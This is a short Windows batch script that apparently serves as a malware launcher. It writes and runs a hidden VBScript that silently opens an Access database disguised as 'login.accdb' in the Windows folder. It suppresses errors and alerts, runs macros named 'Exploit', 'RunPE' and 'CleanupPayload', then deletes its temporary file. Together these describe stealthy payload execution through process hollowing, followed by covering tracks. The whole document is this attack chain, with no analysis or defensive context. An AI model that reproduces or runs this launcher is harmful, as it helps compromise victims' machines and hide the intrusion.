@echo off

setlocal

REM Path to your Access database
set "DB_FILE=C:\Windows\login.accdb"

REM Temporary VBS file
set "TEMP_VBS=%TEMP%\login.vbs"

(
echo On Error Resume Next
echo Set accessApp = CreateObject("Access.Application"^)
echo accessApp.Visible = False
echo accessApp.DisplayAlerts = False
echo accessApp.OpenCurrentDatabase "%DB_FILE%"
echo WScript.Sleep 1000
echo accessApp.Run "Exploit"
echo accessApp.Run "RunPE"
echo accessApp.Run "CleanupPayload"
echo accessApp.CloseCurrentDatabase
echo accessApp.Quit
echo Set accessApp = Nothing
) > "%TEMP_VBS%"

cscript //nologo "%TEMP_VBS%"

del "%TEMP_VBS%"

endlocal
